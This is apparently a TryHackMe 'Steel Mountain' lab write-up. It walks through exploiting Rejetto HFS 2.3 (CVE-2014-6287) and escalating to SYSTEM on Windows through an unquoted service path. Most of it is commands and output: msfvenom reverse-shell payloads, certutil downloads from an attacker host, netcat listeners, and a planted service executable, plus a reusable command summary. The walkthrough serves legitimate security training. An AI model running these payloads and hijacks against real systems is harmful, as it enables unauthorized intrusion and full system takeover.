# Steel Mountain - TryHackMe

> **Kill Chain Summary**: Enumerate services on the target to identify Rejetto HTTP File Server (HFS) version 2.3 running on port 8080, and exploit an unauthenticated remote code execution vulnerability (`CVE-2014-6287`) using a Python script to gain an initial shell as user `bill`. Transfer Windows privilege escalation tools and identify an unquoted service path associated with `AdvancedSystemCareService9` residing in `C:\Program Files (x86)\IObit\Advanced SystemCare\`. Address PowerShell command line pitfalls where `sc` acts as an alias for `Set-Content` by utilizing `sc.exe`, drop a malicious service executable named `Advanced.exe` into the writable parent directory, and restart the service to execute payloads with `NT AUTHORITY\SYSTEM` privileges.

| Property | Value |
| --- | --- |
| **Target Name** | Steel Mountain |
| **Platform** | TryHackMe |
| **OS** | Windows |
| **Difficulty** | Easy / Medium |
| **Status** | Rooted |
| **Key Techniques** | Rejetto HTTP File Server (HFS 2.3) RCE (CVE-2014-6287), PowerShell Shell Stabilization, Unquoted Service Path (AdvancedSystemCareService9), PowerShell Alias Pitfall (sc vs sc.exe) |

---

## 1. Reconnaissance and Enumeration

### TCP Port Scanning

A full TCP port scan was performed to discover all exposed network services:

```bash
sudo nmap -p- -sS --min-rate 1000 -T4 -Pn $IP
```

**Port Scan Results:**

| Port | Service | Version / Details | Operational Role |
| --- | --- | --- | --- |
| **80/tcp** | http | Microsoft IIS httpd | Steel Mountain Corporate Landing Page |
| **135/tcp** | msrpc | Microsoft Windows RPC | Endpoint Mapper |
| **139/tcp** | netbios-ssn | Microsoft Windows netbios-ssn | NetBIOS Session Service |
| **445/tcp** | microsoft-ds | Windows SMB | Server Message Block (SMB) |
| **3389/tcp** | ms-wbt-server | Microsoft Terminal Services | Remote Desktop Protocol (RDP) |
| **8080/tcp** | http-proxy | HttpFileServer 2.3 | Rejetto HTTP File Server (HFS) |

### Web Application and Service Enumeration

1. **Port 80 (Corporate Portal)**:
   A static web page displaying company branding and an "Employee of the Month" image titled `BillHarper.png`.

2. **SMB Enumeration (Port 445)**:
   Attempting anonymous or null session authentication with `enum4linux` failed with `NT_STATUS_ACCESS_DENIED`.

3. **Port 8080 (Rejetto HTTP File Server)**:
   Navigating to `http://$IP:8080` identified the software banner as **Rejetto HTTP File Server (HFS) version 2.3**.

Querying `searchsploit` for public vulnerabilities matching this service:

```bash
searchsploit HttpFileServer 2.3
```

Results:
```text
Rejetto HttpFileServer 2.3.x - Remote Command Execution (CVE-2014-6287) | windows/remote/39161.py
```

---

## 2. Initial Access

### Exploiting Rejetto HFS 2.3 (CVE-2014-6287)

The vulnerability stems from improper handling of null byte characters (`%00`) within macro routines in the search parameter, allowing remote unauthenticated users to execute arbitrary commands by invoking VBScript macros or injecting system shell commands.

A standalone Python exploit script (`exploit.py`) was configured with the local listener and target host settings:

```python
lhost = '192.168.129.253'
lport = '4444'
rhost = '10.128.187.208'
rport = '8080'
```

#### Exploit Execution

A Netcat listener was prepared on the attack machine:

```bash
nc -lvnp 4444
```

The exploit was triggered:

```bash
python3 exploit.py
```

The listener caught the reverse connection, granting access as local user `bill`:

```cmd
connect to [192.168.129.253] from (UNKNOWN) [10.128.187.208] 49192
whoami
steelmountain\bill
```

The user flag was retrieved from Bill's desktop:

```cmd
type C:\Users\bill\Desktop\user.txt
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### Shell Stabilization and Troubleshooting Tool Execution

During initial privilege escalation attempts, automated audit scripts (`winpeas.exe` and `winPEAS.ps1`) were transferred to the target host via `certutil.exe`:

```cmd
certutil -urlcache -split -f http://192.168.129.253/winPEASany.exe winpeas.exe
```

When executing `winpeas.exe` inside the initial reverse shell spawned by the Python exploit, the terminal froze without returning output. This behavior occurs because the lightweight PowerShell one-liner spawned during the exploit lacks proper handle management for large standard output buffers and interactive streams.

To achieve terminal stability, a dedicated Windows executable reverse shell was generated:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.129.253 LPORT=4445 -f exe -o shell.exe
```

The compiled binary was transferred and executed, yielding a stable `cmd.exe` environment that handled heavy command output reliably.

### Service Enumeration: Unquoted Service Path

Auditing Windows services configured to run automatically without quoted path parameters:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\" | findstr /i /v """
```

The query returned a vulnerable third-party service:

- **Service Name**: `AdvancedSystemCareService9`
- **Display Name**: Advanced SystemCare Service 9
- **Path**: `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
- **Start Mode**: Auto

Checking write permissions on the intermediate directory structure revealed that `BUILTIN\Users` possesses write access to `C:\Program Files (x86)\IObit\`.

### The PowerShell `sc` vs `sc.exe` Alias Pitfall

When interacting with services from a PowerShell console, running:

```powershell
sc qc AdvancedSystemCareService9
sc query AdvancedSystemCareService9
```

produced no output or failed silently.

**Technical Root Cause**:
In PowerShell, `sc` is a built-in alias for the `Set-Content` cmdlet:

```powershell
Get-Alias sc
# Definition: Set-Content
```

Typing `sc qc AdvancedSystemCareService9` instructed PowerShell to write data to a file instead of communicating with the Windows Service Control Manager.

**Resolution**: Always specify the full binary name `sc.exe` or execute service commands from a standard `cmd.exe` prompt:

```cmd
sc.exe qc AdvancedSystemCareService9
```

Query output:
```text
SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Advanced SystemCare Service 9
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

The service runs under the high-privilege `LocalSystem` account (`NT AUTHORITY\SYSTEM`).

### Exploiting the Unquoted Service Path

Because the path contains spaces and lacks quotation marks, Windows attempts execution in the following hierarchical order:

1. `C:\Program.exe`
2. `C:\Program Files (x86)\IObit\Advanced.exe`
3. `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`

By placing a malicious executable named `Advanced.exe` inside `C:\Program Files (x86)\IObit\`, the operating system will execute it whenever the service starts.

#### Payload Generation and Deployment

A reverse shell payload configured as a Windows service executable was created on Kali:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.129.253 LPORT=1234 -f exe-service -o Advanced.exe
```

The binary was downloaded to the vulnerable directory:

```cmd
certutil -urlcache -split -f http://192.168.129.253/Advanced.exe "C:\Program Files (x86)\IObit\Advanced.exe"
```

A Netcat listener was opened on Kali:

```bash
nc -lvnp 1234
```

The service was restarted:

```cmd
sc.exe stop AdvancedSystemCareService9
sc.exe start AdvancedSystemCareService9
```

The listener caught the incoming connection with full system privileges:

```cmd
connect to [192.168.129.253] from (UNKNOWN) [10.128.187.208] 49248
whoami
nt authority\system
```

The root flag was retrieved:

```cmd
type C:\Users\Administrator\Desktop\root.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Searchsploit Lookup for Rejetto HFS
searchsploit HttpFileServer 2.3

# Generating Windows Reverse Shell Payloads
# Standard Executable for Shell Stabilization:
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe

# Service Executable for Unquoted Service Path Exploitation:
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe-service -o Advanced.exe

# File Transfer via Certutil
certutil -urlcache -split -f http://IP/file.exe "C:\destination\file.exe"

# Querying Services with Full Binary Name
sc.exe qc [ServiceName]
sc.exe query [ServiceName]
sc.exe stop [ServiceName]
sc.exe start [ServiceName]
```

---

## 5. Key Takeaways and Lessons Learned

1. **PowerShell Aliases vs Native System Binaries**:
   PowerShell aliases can mask native Windows administrative utilities. Most critically, `sc` is aliased to `Set-Content`, `curl` and `wget` are aliased to `Invoke-WebRequest`, and `kill` is aliased to `Stop-Process`. Always append `.exe` (`sc.exe`, `curl.exe`) or execute administrative commands inside `cmd.exe` to avoid silent execution failures.

2. **Upgrading Unstable Reverse Shells**:
   Non-interactive or lightweight script reverse shells frequently crash or buffer when receiving large terminal outputs (such as WinPEAS or seatbelt execution). Transferring a compiled standalone reverse shell executable (`msfvenom -f exe`) establishes a stable, native `cmd.exe` process that will not terminate unexpectedly under heavy output.

3. **Service Payload Formats**:
   When replacing a service binary or hijacking a service execution path, always specify `-f exe-service` in `msfvenom`. A standard user executable (`-f exe`) does not register a service handler with the Service Control Manager, which causes Windows to terminate the process after an error timeout.

4. **Unquoted Service Path Exploitation Requirements**:
   Successfully exploiting an unquoted service path requires three distinct conditions:
   - The path must contain spaces without enclosing quotes.
   - The user must possess write permissions to one of the parent directories.
   - The user must possess the privilege to restart the service, or the service must be configured to start automatically upon system reboot.

---

#thm #windows #hfs #rejetto #cve-2014-6287 #powershell #sc-alias #unquoted-service-path #msfvenom #exe-service #certutil #easy
